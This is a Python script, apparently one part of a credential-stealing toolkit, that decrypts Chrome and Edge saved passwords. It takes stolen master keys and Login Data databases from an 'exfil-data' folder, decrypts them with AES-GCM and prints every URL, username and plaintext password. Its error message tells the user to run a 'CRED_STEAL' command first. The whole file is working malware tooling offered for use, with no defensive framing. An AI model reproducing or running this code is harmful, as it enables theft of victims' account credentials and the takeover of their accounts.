import sqlite3
import os
import glob
from Crypto.Cipher import AES

# Configuration
# This finds the absolute path to the project root (one level up from this script)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
EXFIL_DIR = os.path.join(PROJECT_ROOT, "exfil-data")

def get_latest_files(browser_name):
    """Finds the most recent .key and .db pair for a given browser."""
    keys = glob.glob(os.path.join(EXFIL_DIR, f"{browser_name}_master_*.key"))
    dbs = glob.glob(os.path.join(EXFIL_DIR, f"{browser_name}_LoginData_*.db"))
    
    if not keys or not dbs:
        return None, None
    
    # Sort by modification time to get the newest
    latest_key = max(keys, key=os.path.getmtime)
    latest_db = max(dbs, key=os.path.getmtime)
    
    return latest_key, latest_db

def decrypt_password(ciphertext, master_key):
    try:
        # Chromium v10/v11 format: prefix "v10" (3 bytes) + IV (12 bytes) + Payload
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        
        # The payload contains the encrypted password and the 16-byte GCM tag at the end
        ciphertext_actual = payload[:-16]
        tag = payload[-16:]
        
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt_and_verify(ciphertext_actual, tag)
        return decrypted_pass.decode('utf-8')
    except Exception as e:
        return f"[Error: {e}]"

def process_browser(name):
    key_path, db_path = get_latest_files(name)
    if not key_path:
        print(f"[*] No data found for {name}.")
        return

    print(f"[*] Processing {name}...")
    print(f"    Key: {os.path.basename(key_path)}")
    print(f"    DB:  {os.path.basename(db_path)}")

    try:
        with open(key_path, "rb") as f:
            master_key = f.read()

        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        rows = cursor.fetchall()
        if not rows:
            print(f"    [!] No saved logins found in {name} database.")
        else:
            print(f"\n{'URL':<50} | {'Username':<20} | {'Password'}")
            print("-" * 100)
            for url, user, enc_pass in rows:
                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                    password = decrypt_password(enc_pass, master_key)
                else:
                    password = "[Unknown Format]"
                print(f"{url[:50]:<50} | {user[:20]:<20} | {password}")
            print("\n")
        
        conn.close()
    except Exception as e:
        print(f"    [!] Error processing {name}: {e}")

if __name__ == "__main__":
    if not os.path.exists(EXFIL_DIR):
        print(f"[!] Directory '{EXFIL_DIR}' not found. Run the CRED_STEAL command first.")
    else:
        print("=== Chromium Credential Decryptor ===\n")
        process_browser("Edge")
        process_browser("Chrome")
